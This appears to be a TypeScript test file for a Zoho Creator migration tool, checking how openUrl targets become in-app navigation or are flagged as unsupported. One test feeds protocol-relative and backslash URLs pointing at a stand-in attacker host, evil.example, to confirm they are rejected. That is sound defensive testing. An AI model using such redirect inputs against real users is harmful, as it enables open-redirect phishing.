      openUrl(zoho.appuri + "print/NoSuchPage?Order_Id=" + order_id,"new window");
    }
    void order.printUndeclared(int order_id)
    {
      openUrl(zoho.appuri + "print/Restaurant_Bill?wrongParam=" + order_id,"new window");
    }
  }
  workflow
  {
    functions
    {
      Print_Bill as "Print Bill"
      {
        type = functions
        form = Order_Form
        execution type = for each record
        on start { actions { thisapp.order.print(ID); } }
      }
      Open_Summary as "Event Summary"
      {
        type = functions
        form = Order_Form
        execution type = for each record
        on start { actions { thisapp.Event_Custom_Actions.eventSummery(ID); } }
      }
      Print_Missing as "Print Missing Page"
      {
        type = functions
        form = Order_Form
        execution type = for each record
        on start { actions { thisapp.order.printMissing(ID); } }
      }
      Print_Undeclared as "Print Undeclared Param"
      {
        type = functions
        form = Order_Form
        execution type = for each record
        on start { actions { thisapp.order.printUndeclared(ID); } }
      }
    }
  }
}
`;
  const app = deriveIr(parse(ds));
  const gen = generate(app);
  const unsupportedTodos = gen.todos.filter((t) => t.construct === 'openurl-unsupported-target');
  assert.equal(unsupportedTodos.length, 2, 'only the missing page and undeclared param targets are counted');

  const { model } = buildUi(app);
  const rep = model.reports.find((r) => r.name === 'All_Orders');
  assert.deepEqual(rep?.customActions.find((a) => a.name === 'Print Bill')?.navigate, {
    kind: 'page',
    target: 'Restaurant_Bill',
    href: '#/page/Restaurant_Bill',
    params: [{ name: 'Order_Id', field: 'ROWID' }],
  });
  assert.deepEqual(rep?.customActions.find((a) => a.name === 'Event Summary')?.navigate, {
    kind: 'page',
    target: 'Event_Summery1',
    href: '#/page/Event_Summery1',
    params: [{ name: 'event', field: 'ROWID' }],
  });
  for (const name of ['Print Missing Page', 'Print Undeclared Param']) {
    const item: UiAction | undefined = rep?.customActions.find((a) => a.name === name);
    assert.equal(item?.preview, true, `${name} stays turned off`);
    assert.equal(item?.navigate, undefined, `${name} is no navigation`);
  }
});

test('a #Page: openUrl target with declared page params is client navigation, not a counted todo', () => {
  // Creator pages declare input parameters (`page Detail(param1, param2)`)
  // and a real app's openUrl fills them from the clicked row. The UI model
  // already wires such a link (the params ride the generated #/page/ route
  // query); the generator's classifier counted every page query name as an
  // unsupported target, so a working navigation still showed up in the
  // residual. Only names the page declares migrate — anything else stays
  // counted and turned off.
  const page = JSON.stringify("<zml><layout><row><column width='100%'><text value='Hi'></text></column></row></layout></zml>");
  const ds = `application "PageParams"
{
  form Task
  {
    Task_Title ( type = text )
  }
  list All_Tasks
  {
    show all rows from Task
    (
      Task_Title
      custom action "Open Detail" ( workflow = Open_Detail )
      custom action "Open Undeclared" ( workflow = Open_Undeclared )
      custom action "Open Case Mismatch" ( workflow = Open_Case_Mismatch )
    )
  }
  page Detail(param1, param2)
  {
    Content=${page}
  }
  workflow
  {
    functions
    {
      Open_Detail as "Open Detail"
      {
        type = functions
        form = Task
        execution type = for each record
        on start { actions { on click ( openUrl("#Page:Detail?param1=" + input.Task_Title + "&param2=Fixed","same window"); ) } }
      }
      Open_Undeclared as "Open Undeclared"
      {
        type = functions
        form = Task
        execution type = for each record
        on start { actions { on click ( openUrl("#Page:Detail?nope=" + input.Task_Title,"same window"); ) } }
      }
      Open_Case_Mismatch as "Open Case Mismatch"
      {
        type = functions
        form = Task
        execution type = for each record
        on start { actions { on click ( openUrl("#Page:Detail?PARAM1=" + input.Task_Title,"same window"); ) } }
      }
    }
  }
}
`;
  const app = deriveIr(parse(ds));
  const gen = generate(app);
  const unsupportedTodos = gen.todos.filter((t) => t.construct === 'openurl-unsupported-target');
  assert.equal(unsupportedTodos.length, 2, 'only the undeclared and case-mismatched page params are counted');

  const { model } = buildUi(app);
  const rep = model.reports.find((r) => r.name === 'All_Tasks');
  assert.deepEqual(rep?.customActions.find((a) => a.name === 'Open Detail')?.navigate, {
    kind: 'page',
    target: 'Detail',
    href: '#/page/Detail',
    params: [
      { name: 'param1', field: 'Task_Title' },
      { name: 'param2', value: 'Fixed' },
    ],
  });
  for (const name of ['Open Undeclared', 'Open Case Mismatch']) {
    const item: UiAction | undefined = rep?.customActions.find((a) => a.name === name);
    assert.equal(item?.preview, true, `${name} stays turned off`);
    assert.equal(item?.navigate, undefined, `${name} is no navigation`);
  }
});

test('a #Report: or #View: openUrl target with a single equality field filter on the report form is client navigation, while operator or invalid filters stay counted', async () => {
  const ds = `application "ReportFilterNavigation"
{
  form Machine
  {
    Machine_Name ( type = text )
  }
  form Installation
  {
    Machine_Name ( type = text )
    Viewed_Property_Rec_Id ( type = number )
  }
  list All_Machines
  {
    show all rows from Machine
    (
      Machine_Name
      custom action "View Software" ( workflow = View_Software )
      custom action "View Enquiries" ( workflow = View_Enquiries )
      custom action "Direct Summary" ( workflow = Direct_Summary )
      custom action "Op Filter" ( workflow = Op_Filter )
    )
  }
  list Installed_Softwares
  {
    show all rows from Installation
    (
      Machine_Name
      Viewed_Property_Rec_Id
    )
  }
  workflow
  {
    functions
    {
      void showSoftware(string mecName)
      {
        openUrl("#View:Installed_Softwares?Machine_Name=" + mecName,"Same Window");
      }
      void showEnquiries(int id)
      {
        openUrl(zoho.appuri + "#Report:Installed_Softwares?Viewed_Property_Rec_Id=" + id + "&zc_Header=false&zc_AddRec=false","popup window","height=500px,width=800px");
      }
      View_Software as "View Software"
      {
        type = functions
        form = Machine
        execution type = for each record
        on start { actions { on click ( thisapp.showSoftware(input.Machine_Name); ) } }
      }
      View_Enquiries as "View Enquiries"
      {
        type = functions
        form = Machine
        execution type = for each record
        on start { actions { on click ( thisapp.showEnquiries(input.ID); ) } }
      }
      Direct_Summary as "Direct Summary"
      {
        type = functions
        form = Machine
        execution type = for each record
        on start { actions { on click ( openUrl("https://app.zohocreator.in" + zoho.appuri + "#Report:Installed_Softwares?Machine_Name=" + input.Machine_Name,"new window"); ) } }
      }
      Op_Filter as "Op Filter"
      {
        type = functions
        form = Machine
        execution type = for each record
        on start { actions { on click ( openUrl("#Report:Installed_Softwares?Machine_Name=" + input.Machine_Name + "&Machine_Name_op=26","new window"); ) } }
      }
    }
  }
}
`;
  const app = deriveIr(parse(ds));
  const gen = generate(app);
  const unsupportedTodos = gen.todos.filter((t) => t.construct === 'openurl-unsupported-target');
  assert.equal(unsupportedTodos.length, 1, 'only the operator filter parameter is counted as unsupported');

  const { model } = buildUi(app);
  const rep = model.reports.find((r) => r.name === 'All_Machines')!;
  const viewSoft = rep.customActions.find((a) => a.name === 'View Software');
  const viewEnq = rep.customActions.find((a) => a.name === 'View Enquiries');
  const directSum = rep.customActions.find((a) => a.name === 'Direct Summary');
  const opFilter = rep.customActions.find((a) => a.name === 'Op Filter');

  assert.deepEqual(viewSoft?.navigate, {
    kind: 'report',
    target: 'Installed_Softwares',
    href: '#/report/Installed_Softwares',
    params: [{ name: 'Machine_Name', field: 'Machine_Name' }],
  });
  assert.deepEqual(viewEnq?.navigate, {
    kind: 'report',
    target: 'Installed_Softwares',
    href: '#/report/Installed_Softwares',
    params: [{ name: 'Viewed_Property_Rec_Id', field: 'ROWID' }],
  });
  assert.deepEqual(directSum?.navigate, {
    kind: 'report',
    target: 'Installed_Softwares',
    href: '#/report/Installed_Softwares',
    params: [{ name: 'Machine_Name', field: 'Machine_Name' }],
  });
  assert.equal(opFilter?.preview, true);
  assert.equal(opFilter?.navigate, undefined);

  const rt = (await runtime()) as Runtime & {
    actionNavHref(nav: unknown, row: unknown): string | undefined;
    reportClickFilter(hash: string): { field: string; value: string } | null;
  };
  const href = rt.actionNavHref(viewSoft?.navigate, { ROWID: '12', Machine_Name: 'MacBook Pro & Studio' });
  assert.equal(href, '#/report/Installed_Softwares?Machine_Name=MacBook%20Pro%20%26%20Studio');
  assert.deepEqual(rt.reportClickFilter(href!), { field: 'Machine_Name', value: 'MacBook Pro & Studio' });
  assert.equal(rt.actionNavHref(viewSoft?.navigate, { ROWID: '12' }), undefined);
});

test('one-level lookup field reads and form record-typed parameter reads in openUrl are client navigation, not counted todos', () => {
  const ds = `application "LookupAndRecordReads"
{
  form Customer
  {
    Customer_Name ( type = text )
    Email ( type = email )
  }
  form Invoice
  {
    Invoice_No ( type = text )
    Customer_Ref
    (
      type = picklist
      values = Customer.ID
      displayformat = [Customer_Name]
    )
  }
  form Receipt
  {
    Customer_Name ( type = text )
    Invoice_Ref ( type = text )
  }
  list All_Invoices
  {
    show all rows from Invoice
    (
      Invoice_No
      custom action "Prefill From Lookup" ( workflow = Prefill_Lookup )
      custom action "Delegate Record" ( workflow = Delegate_Record )
      custom action "Delegate Lookup" ( workflow = Delegate_Lookup )
      custom action "Bad Lookup Leaf" ( workflow = Bad_Lookup_Leaf )
    )
  }
  functions
  {
    void launch.openReceipt(Invoice inv)
    {
      openUrl("#Form:Receipt?Invoice_Ref=" + inv.ID + "&Customer_Name=" + inv.Invoice_No,"same window");
    }
    void launch.openReceiptLookup(Invoice inv)
    {
      openUrl("#Form:Receipt?Customer_Name=" + inv.Customer_Ref.Customer_Name,"same window");
    }
  }
  workflow
  {
    functions
    {
      Prefill_Lookup as "Prefill From Lookup"
      {
        type = functions
        form = Invoice
        execution type = for each record
        on start { actions { on click ( openUrl("#Form:Receipt?Customer_Name=" + input.Customer_Ref.Customer_Name,"same window"); ) } }
      }
      Delegate_Record as "Delegate Record"
      {
        type = functions
        form = Invoice
        execution type = for each record
        on start { actions { on click ( thisapp.launch.openReceipt(Invoice); ) } }
      }
      Delegate_Lookup as "Delegate Lookup"
      {
        type = functions
        form = Invoice
        execution type = for each record
        on start { actions { on click ( thisapp.launch.openReceiptLookup(Invoice); ) } }
      }
      Bad_Lookup_Leaf as "Bad Lookup Leaf"
      {
        type = functions
        form = Invoice
        execution type = for each record
        on start { actions { on click ( openUrl("#Form:Receipt?Customer_Name=" + input.Customer_Ref.Missing_Field,"same window"); ) } }
      }
    }
  }
}
`;
  const app = deriveIr(parse(ds));
  const gen = generate(app);
  const unsupportedTodos = gen.todos.filter((t) => t.construct === 'openurl-unsupported-target');
  assert.equal(unsupportedTodos.length, 1, 'only the missing lookup leaf is counted as openurl-unsupported-target');

  const { model } = buildUi(app);
  const rep = model.reports.find((r) => r.name === 'All_Invoices');
  assert.deepEqual(rep?.customActions.find((a) => a.name === 'Prefill From Lookup')?.navigate, {
    kind: 'form',
    target: 'Receipt',
    href: '#/form/Receipt',
    params: [{ name: 'Customer_Name', field: 'Customer_Ref.Customer_Name' }],
  });
  assert.deepEqual(rep?.customActions.find((a) => a.name === 'Delegate Record')?.navigate, {
    kind: 'form',
    target: 'Receipt',
    href: '#/form/Receipt',
    params: [
      { name: 'Invoice_Ref', field: 'ROWID' },
      { name: 'Customer_Name', field: 'Invoice_No' },
    ],
  });
  assert.deepEqual(rep?.customActions.find((a) => a.name === 'Delegate Lookup')?.navigate, {
    kind: 'form',
    target: 'Receipt',
    href: '#/form/Receipt',
    params: [{ name: 'Customer_Name', field: 'Customer_Ref.Customer_Name' }],
  });
  const bad = rep?.customActions.find((a) => a.name === 'Bad Lookup Leaf');
  assert.equal(bad?.preview, true);
  assert.equal(bad?.navigate, undefined);
});

test('record-targeted openUrl links — recLinkID, record-edit and record-summary — navigate to the record screens', async () => {
  // Creator links a row's own screens three ways: `#Form:X?recLinkID=<id>`,
  // `<form>/record-edit/<report>/<id>` and `record-summary/<target>/<id>`.
  // `recLinkID` and `viewLinkName` are Creator link syntax, never fields of
  // the target form; the remaining query names are field presets on the
  // loaded record, carried like add-form prefill.
  const ds = `application "RecordNav"
{
  form Item
  {
    Name ( type = text )
    Status ( type = text )
    Note ( type = text )
  }
  list All_Items
  {
    show all rows from Item
    (
      Name
      custom action "Edit" ( workflow = Edit_Item )
      custom action "Edit Permalink" ( workflow = Edit_Permalink )
      custom action "Summary" ( workflow = View_Summary )
      custom action "Bad Report" ( workflow = Bad_Report )
      custom action "Bad Id" ( workflow = Bad_Id )
      custom action "Missing Target" ( workflow = Missing_Target )
    )
  }
  functions
  {
    void customActions.editItem(int recID)
    {
      openUrl("#Form:Item?recLinkID=" + recID + "&viewLinkName=All_Items&Status=Out","popup window");
    }
    void customActions.editPermalink(int recID)
    {
      openUrl(zoho.appuri + "Item/record-edit/All_Items/" + recID + "?Status=Out","same window");
    }
    void customActions.viewSummary(int recID)
    {
      openUrl(zoho.appuri + "record-summary/All_Items/" + recID,"new window");
    }
    void customActions.badReport(int recID)
    {
      openUrl(zoho.appuri + "Item/record-edit/No_Such_View/" + recID,"same window");
    }
    void customActions.badId(int recID)
    {
      openUrl("#Form:Item?recLinkID=x" + recID,"same window");
    }
    void customActions.missingTarget(int recID)
    {
      openUrl(zoho.appuri + "record-summary/Nowhere/" + recID,"same window");
    }
  }
  workflow
  {
    functions
    {
      Edit_Item as "Edit Item"
      {
        type = functions
        form = Item
        execution type = for each record
        on start { actions { thisapp.customActions.editItem(ID); } }
      }
      Edit_Permalink as "Edit Permalink"
      {
        type = functions
        form = Item
        execution type = for each record
        on start { actions { thisapp.customActions.editPermalink(ID); } }
      }
      View_Summary as "View Summary"
      {
        type = functions
        form = Item
        execution type = for each record
        on start { actions { thisapp.customActions.viewSummary(ID); } }
      }
      Bad_Report as "Bad Report"
      {
        type = functions
        form = Item
        execution type = for each record
        on start { actions { thisapp.customActions.badReport(ID); } }
      }
      Bad_Id as "Bad Id"
      {
        type = functions
        form = Item
        execution type = for each record
        on start { actions { thisapp.customActions.badId(ID); } }
      }
      Missing_Target as "Missing Target"
      {
        type = functions
        form = Item
        execution type = for each record
        on start { actions { thisapp.customActions.missingTarget(ID); } }
      }
    }
  }
}
`;
  const app = deriveIr(parse(ds));
  const { model } = buildUi(app);
  const rep = model.reports.find((r) => r.name === 'All_Items');
  const byName = new Map((rep?.customActions ?? []).map((item) => [item.name, item]));
  assert.deepEqual(byName.get('Edit')?.navigate, {
    kind: 'form',
    target: 'Item',
    href: '#/form/Item/edit',
    record: { field: 'ROWID' },
    params: [{ name: 'Status', value: 'Out' }],
  });
  assert.deepEqual(byName.get('Edit Permalink')?.navigate, {
    kind: 'form',
    target: 'Item',
    href: '#/form/Item/edit',
    record: { field: 'ROWID' },
    params: [{ name: 'Status', value: 'Out' }],
  });
  assert.deepEqual(byName.get('Summary')?.navigate, {
    kind: 'report',
    target: 'All_Items',
    href: '#/report/All_Items/row',
    record: { field: 'ROWID' },
    params: [],
  });
  for (const name of ['Edit', 'Edit Permalink', 'Summary']) assert.equal(byName.get(name)?.preview, undefined, `${name} is enabled`);
  for (const name of ['Bad Report', 'Bad Id', 'Missing Target']) {
    assert.equal(byName.get(name)?.preview, true, `${name} stays turned off`);
    assert.equal(byName.get(name)?.navigate, undefined, `${name} is no navigation`);
  }

  // The static client appends the row id after the edit/row segment.
  const rt = await runtime();
  const rows = rt.renderReportRows(rep, [{ ROWID: '42', Name: 'Desk', Status: 'In' }]);
  assert.ok(rows.includes('#/form/Item/edit/42?Status=Out'), 'edit link carries the row id and presets');
  assert.ok(rows.includes('#/report/All_Items/row/42'), 'summary link carries the row id');
});

test('an edit route query presets the loaded record fields on the edit screen', async () => {
  const rt = await runtime();
  assert.deepEqual(rt.parseRoute('#/form/Item/edit/42?Status=Out'), {
    name: 'form',
    id: 'Item',
    edit: '42',
    prefill: { Status: 'Out' },
  });
  assert.deepEqual(rt.parseRoute('#/form/Item?Status=Out'), {
    name: 'form',
    id: 'Item',
    edit: undefined,
    prefill: { Status: 'Out' },
  });
});

test('record-targeted openUrl links (recLinkID, record-edit, record-summary) resolve to edit and summary routes', async () => {
  const ds = `application "RecordLinks"
{
  form Task
  {
    Title ( type = text )
    Status ( type = text )
  }
  form Other
  {
    Name ( type = text )
  }
  list All_Tasks
  {
    show all rows from Task
    (
      Title
      Status
      custom action "Edit By RecLink" ( workflow = Edit_RecLink )
      custom action "Edit Permalink" ( workflow = Edit_Permalink )
      custom action "Report Summary" ( workflow = Report_Summary )
      custom action "Form Summary" ( workflow = Form_Summary )
      custom action "Wrong Report Edit" ( workflow = Wrong_Report_Edit )
      custom action "Empty RecLink" ( workflow = Empty_RecLink )
    )
  }
  list Other_List
  {
    show all rows from Other
    (
      Name
    )
  }
  workflow
  {
    functions
    {
      Edit_RecLink as "Edit By RecLink"
      {
        type = functions
        form = Task
        execution type = for each record
        on start { actions { on click ( openUrl("#Form:Task?recLinkID=" + input.ID + "&viewLinkName=All_Tasks&Status=Out&zc_LoadIn=dialog","same window"); ) } }
      }
      Edit_Permalink as "Edit Permalink"
      {
        type = functions
        form = Task
        execution type = for each record
        on start { actions { on click ( openUrl(zoho.appuri + "Task/record-edit/All_Tasks/" + input.ID + "?Status=Out","same window"); ) } }
      }
      Report_Summary as "Report Summary"
      {
        type = functions
        form = Task
        execution type = for each record
        on start { actions { on click ( openUrl(zoho.appuri + "record-summary/All_Tasks/" + input.ID,"same window"); ) } }
      }
      Form_Summary as "Form Summary"
      {
        type = functions
        form = Task
        execution type = for each record
        on start { actions { on click ( openUrl("record-summary/Task/" + input.ID,"same window"); ) } }
      }
      Wrong_Report_Edit as "Wrong Report Edit"
      {
        type = functions
        form = Task
        execution type = for each record
        on start { actions { on click ( openUrl("Task/record-edit/Other_List/" + input.ID,"same window"); ) } }
      }
      Empty_RecLink as "Empty RecLink"
      {
        type = functions
        form = Task
        execution type = for each record
        on start { actions { on click ( openUrl("#Form:Task?recLinkID=","same window"); ) } }
      }
    }
  }
}
`;
  const app = deriveIr(parse(ds));
  const gen = generate(app);
  const unsupportedTodos = gen.todos.filter((t) => t.construct === 'openurl-unsupported-target');
  assert.equal(unsupportedTodos.length, 2, 'only foreign-report record-edit and empty recLinkID are counted');

  const { model } = buildUi(app);
  const rep = model.reports.find((r) => r.name === 'All_Tasks')!;
  const byName = new Map(rep.customActions.map((a) => [a.name, a]));
  assert.deepEqual(byName.get('Edit By RecLink')?.navigate, {
    kind: 'form',
    target: 'Task',
    href: '#/form/Task/edit',
    record: { field: 'ROWID' },
    params: [{ name: 'Status', value: 'Out' }],
  });
  assert.deepEqual(byName.get('Edit Permalink')?.navigate, {
    kind: 'form',
    target: 'Task',
    href: '#/form/Task/edit',
    record: { field: 'ROWID' },
    params: [{ name: 'Status', value: 'Out' }],
  });
  assert.deepEqual(byName.get('Report Summary')?.navigate, {
    kind: 'report',
    target: 'All_Tasks',
    href: '#/report/All_Tasks/row',
    record: { field: 'ROWID' },
    params: [],
  });
  assert.deepEqual(byName.get('Form Summary')?.navigate, {
    kind: 'form',
    target: 'Task',
    href: '#/record/Task',
    record: { field: 'ROWID' },
    params: [],
  });
  for (const bad of ['Wrong Report Edit', 'Empty RecLink']) {
    assert.equal(byName.get(bad)?.preview, true);
    assert.equal(byName.get(bad)?.navigate, undefined);
  }

  const rt = (await runtime()) as Runtime & {
    actionNavHref(nav: unknown, row: unknown): string | undefined;
    renderReportRows(report: unknown, rows: unknown[]): string;
  };
  assert.equal(rt.actionNavHref(byName.get('Edit By RecLink')!.navigate, { ROWID: '42' }), '#/form/Task/edit/42?Status=Out');
  assert.equal(rt.actionNavHref(byName.get('Edit Permalink')!.navigate, { ROWID: '42' }), '#/form/Task/edit/42?Status=Out');
  assert.equal(rt.actionNavHref(byName.get('Report Summary')!.navigate, { ROWID: '42' }), '#/report/All_Tasks/row/42');
  assert.equal(rt.actionNavHref(byName.get('Form Summary')!.navigate, { ROWID: '42' }), '#/record/Task/42');
  assert.equal(rt.actionNavHref(byName.get('Edit By RecLink')!.navigate, { ROWID: null }), undefined, 'a null record id refuses navigation');
  assert.equal(rt.actionNavHref(byName.get('Edit By RecLink')!.navigate, {}), undefined, 'an unset record id refuses navigation');
  const missingRecord = rt.renderReportRows(rep, [{ ROWID: null, Title: 'No record context' }]);
  assert.doesNotMatch(missingRecord, /href="#\/form\/Task\/edit"/, 'no bare edit route is rendered');
  assert.match(missingRecord, /<button type="button" disabled title="Not available yet: this action is turned off\."/, 'the action uses the existing turned-off manual-step control');
});

test('an edit route query presets the loaded record fields on the edit screen', async () => {
  const rt = await runtime();
  assert.deepEqual(rt.parseRoute('#/form/Task/edit/42?Status=Out'), {
    name: 'form',
    id: 'Task',
    edit: '42',
    prefill: { Status: 'Out' },
  });
  assert.deepEqual(rt.parseRoute('#/form/Task?Status=Out'), {
    name: 'form',
    id: 'Task',
    edit: undefined,
    prefill: { Status: 'Out' },
  });
});

test('leading-slash routes, root-relative paths, and same-page anchor fragments resolve as client navigation', () => {
  const page = JSON.stringify("<zml><layout><row><column width='100%'><text value='Hi'></text></column></row></layout></zml>");
  const ds = `application "AnchorsAndRelatives"
{
  form Task
  {
    Title ( type = text )
  }
  list All_Tasks
  {
    show all rows from Task
    (
      Title
      custom action "Slash Form" ( workflow = Slash_Form )
      custom action "Jump Section" ( workflow = Jump_Section )
      custom action "Export Csv" ( workflow = Export_Csv )
      custom action "Protocol Relative" ( workflow = Proto_Rel )
      custom action "Backslash Path" ( workflow = Backslash_Path )
    )
  }
  page Home
  {
    Content=${page}
  }
  workflow
  {
    functions
    {
      Slash_Form as "Slash Form"
      {
        type = functions
        form = Task
        execution type = for each record
        on start { actions { on click ( openUrl("/#Form:Task?Title=" + input.Title,"same window"); ) } }
      }
      Jump_Section as "Jump Section"
      {
        type = functions
        form = Task
        execution type = for each record
        on start { actions { on click ( openUrl("#details-section","same window"); ) } }
      }
      Export_Csv as "Export Csv"
      {
        type = functions
        form = Task
        execution type = for each record
        on start { actions { on click ( openUrl("/export/tasks.csv","new window"); ) } }
      }
      Proto_Rel as "Protocol Relative"
      {
        type = functions
        form = Task
        execution type = for each record
        on start { actions { on click ( openUrl("//evil.example/path","new window"); ) } }
      }
      Backslash_Path as "Backslash Path"
      {
        type = functions
        form = Task
        execution type = for each record
        on start { actions { on click ( openUrl("/\\\\evil.example","new window"); ) } }
      }
    }
  }
}
`;
  const app = deriveIr(parse(ds));
  const gen = generate(app);
  const unsupportedTodos = gen.todos.filter((t) => t.construct === 'openurl-unsupported-target');
  assert.equal(unsupportedTodos.length, 2, 'protocol-relative and backslash paths stay unsupported');

  const { model } = buildUi(app);
  const rep = model.reports.find((r) => r.name === 'All_Tasks')!;
  const byName = new Map(rep.customActions.map((a) => [a.name, a]));
  assert.deepEqual(byName.get('Slash Form')?.navigate, {
    kind: 'form',
    target: 'Task',
    href: '#/form/Task',
    params: [{ name: 'Title', field: 'Title' }],
  });
  assert.deepEqual(byName.get('Jump Section')?.navigate, {
    kind: 'anchor',
    target: 'details-section',
    href: '#details-section',
    params: [],
  });
  assert.deepEqual(byName.get('Export Csv')?.navigate, {
    kind: 'relative',
    target: '/export/tasks.csv',
    href: '/export/tasks.csv',
    params: [],
  });
  for (const bad of ['Protocol Relative', 'Backslash Path']) {
    assert.equal(byName.get(bad)?.preview, true);
    assert.equal(byName.get(bad)?.navigate, undefined);
  }
});

test('interpolated own-app URLs, collection .getall() IDs, and 2-segment record-edit links resolve while invalid targets list their reason', async () => {
  const ds = `application "E-Procurement"
{
  form Purchase_Requisition
  {
    Title ( type = text )
  }
  form Add_Quotation
  {
    Purchase_requisition ( type = number )
    Title ( type = text )
  }
  list All_Requisitions
  {
    show all rows from Purchase_Requisition
    (
      Title
      custom action "Add Quotation" ( workflow = Add_Quotation_Workflow )
      custom action "Schedule All" ( workflow = Schedule_All_Btn )
      custom action "Short Edit Report" ( workflow = Short_Edit_Report_Btn )
      custom action "Short Edit Form" ( workflow = Short_Edit_Form_Btn )
      custom action "Broken Short Edit" ( workflow = Broken_Short_Edit_Btn )
      custom action "Foreign Slug" ( workflow = Foreign_Slug_Btn )
      custom action "Typo Field" ( workflow = Typo_Field_Btn )
    )
  }
  workflow
  {
    functions
    {
      void CustomAction.ScheduleAll(Purchase_Requisition AllCandidates)
      {
        openUrl("#Form:Add_Quotation?Purchase_requisition=" + AllCandidates.ID.getall(),"popup window");
      }
      void CustomAction.ShortEditReport(int rec_ID)
      {
        openUrl(zoho.appuri + "record-edit/All_Requisitions/" + rec_ID,"popup window");
      }
      void CustomAction.ShortEditForm(int rec_ID)
      {
        openUrl(zoho.appuri + "record-edit/Purchase_Requisition/" + rec_ID + "?Title=Updated","popup window");
      }
      void CustomAction.BrokenShortEdit(int rec_ID)
      {
        openUrl(zoho.appuri + "record-edit/Create_Purchase_requisition/" + rec_ID,"popup window");
      }
      Add_Quotation_Workflow as "Add Quotation Workflow"
      {
        type = functions
        form = Purchase_Requisition
        execution type = for each record
        on start
        {
          actions
          {
            on click
            (
              openURL("https://app.zohocreator.in/\${zoho.adminuser}/e-procurement/#Form:Add_Quotation?Purchase_requisition=\${ID}&Title=\${input.Title}","new window");
            )
          }
        }
      }
      Schedule_All_Btn as "Schedule All Btn"
      {
        type = functions
        form = Purchase_Requisition
        execution type = for each record
        on start
        {
          actions
          {
            on click
            (
              thisapp.CustomAction.ScheduleAll(Purchase_Requisition);
            )
          }
        }
      }
      Short_Edit_Report_Btn as "Short Edit Report Btn"
      {
        type = functions
        form = Purchase_Requisition
        execution type = for each record
        on start
        {
          actions
          {
            on click
            (
              thisapp.CustomAction.ShortEditReport(input.ID);
            )
          }
        }
      }
      Short_Edit_Form_Btn as "Short Edit Form Btn"
      {
        type = functions
        form = Purchase_Requisition
        execution type = for each record
        on start
        {
          actions
          {
            on click
            (
              thisapp.CustomAction.ShortEditForm(input.ID);
            )
          }
        }
      }
      Broken_Short_Edit_Btn as "Broken Short Edit Btn"
      {
        type = functions
        form = Purchase_Requisition
        execution type = for each record
        on start
        {
          actions
          {
            on click
            (
              thisapp.CustomAction.BrokenShortEdit(input.ID);
            )
          }
        }
      }
      Foreign_Slug_Btn as "Foreign Slug Btn"
      {
        type = functions
        form = Purchase_Requisition
        execution type = for each record
        on start
        {
          actions
          {
            on click
            (
              openURL("https://app.zohocreator.in/\${zoho.adminuser}/other-app/#Form:Add_Quotation?Purchase_requisition=\${ID}","new window");
            )
          }
        }
      }
      Typo_Field_Btn as "Typo Field Btn"
      {
        type = functions
        form = Purchase_Requisition
        execution type = for each record
        on start
        {
          actions
          {
            on click
            (
              openUrl("#Form:Add_Quotation?Purchase_requisition=" + input.ID + "&Titl=Draft","same window");
            )
          }
        }
      }
    }
  }
}
`;
  const app = deriveIr(parse(ds));
  const gen = generate(app);
  const unsupported = gen.todos.filter((t) => t.construct === 'openurl-unsupported-target');
  assert.deepEqual(
    unsupported.map((t) => t.manualStep),
    [
      'Reconfigure function CustomAction.BrokenShortEdit: its openUrl target is not a supported own-app form, report, or page link (invalid record-edit link).',
      'Reconfigure function Foreign_Slug_Btn: its openUrl target is not a supported own-app form, report, or page link (target is not an own-app #Form, #Report, or #Page route).',
      'Reconfigure function Typo_Field_Btn: its openUrl target is not a supported own-app form, report, or page link (target form Add_Quotation has no field Titl).',
    ],
  );

  const { model } = buildUi(app);
  const rep = model.reports.find((r) => r.name === 'All_Requisitions')!;
  const byName = new Map(rep.customActions.map((a) => [a.name, a]));

  assert.deepEqual(byName.get('Add Quotation')?.navigate, {
    kind: 'form',
    target: 'Add_Quotation',
    href: '#/form/Add_Quotation',
    params: [
      { name: 'Purchase_requisition', field: 'ROWID' },
      { name: 'Title', field: 'Title' },
    ],
  });
  assert.deepEqual(byName.get('Schedule All')?.navigate, {
    kind: 'form',
    target: 'Add_Quotation',
    href: '#/form/Add_Quotation',
    params: [{ name: 'Purchase_requisition', field: 'ROWID' }],
  });
  assert.deepEqual(byName.get('Short Edit Report')?.navigate, {
    kind: 'form',
    target: 'Purchase_Requisition',
    href: '#/form/Purchase_Requisition/edit',
    record: { field: 'ROWID' },
    params: [],
  });
  assert.deepEqual(byName.get('Short Edit Form')?.navigate, {
    kind: 'form',
    target: 'Purchase_Requisition',
    href: '#/form/Purchase_Requisition/edit',
    record: { field: 'ROWID' },
    params: [{ name: 'Title', value: 'Updated' }],
  });
  for (const bad of ['Broken Short Edit', 'Foreign Slug', 'Typo Field']) {
    assert.equal(byName.get(bad)?.preview, true, `${bad} stays turned off`);
    assert.equal(byName.get(bad)?.navigate, undefined, `${bad} has no navigation`);
  }

  const rt = (await runtime()) as Runtime & { actionNavHref(nav: unknown, row: unknown): string | undefined };
  assert.equal(
    rt.actionNavHref(byName.get('Add Quotation')!.navigate, { ROWID: '99', Title: 'Laptops' }),
    '#/form/Add_Quotation?Purchase_requisition=99&Title=Laptops',
  );
  assert.equal(rt.actionNavHref(byName.get('Schedule All')!.navigate, { ROWID: '99' }), '#/form/Add_Quotation?Purchase_requisition=99');
  assert.equal(rt.actionNavHref(byName.get('Short Edit Report')!.navigate, { ROWID: '99' }), '#/form/Purchase_Requisition/edit/99');
  assert.equal(rt.actionNavHref(byName.get('Short Edit Form')!.navigate, { ROWID: '99' }), '#/form/Purchase_Requisition/edit/99?Title=Updated');

  // Punctuated app names with leading/trailing separator runs still normalize cleanly without regex backtracking.
  const punctuatedApp = deriveIr(parse(ds.replace('application "E-Procurement"', `application "---E___Procurement---"`)));
  const punctuatedGen = generate(punctuatedApp);
  assert.equal(
    punctuatedGen.todos.filter((t) => t.construct === 'openurl-unsupported-target').length,
    3,
  );
  const { model: punctuatedModel } = buildUi(punctuatedApp);
  const punctuatedAct = punctuatedModel.reports[0]!.customActions.find((a) => a.name === 'Add Quotation');
  assert.equal(punctuatedAct?.navigate?.href, '#/form/Add_Quotation');
});

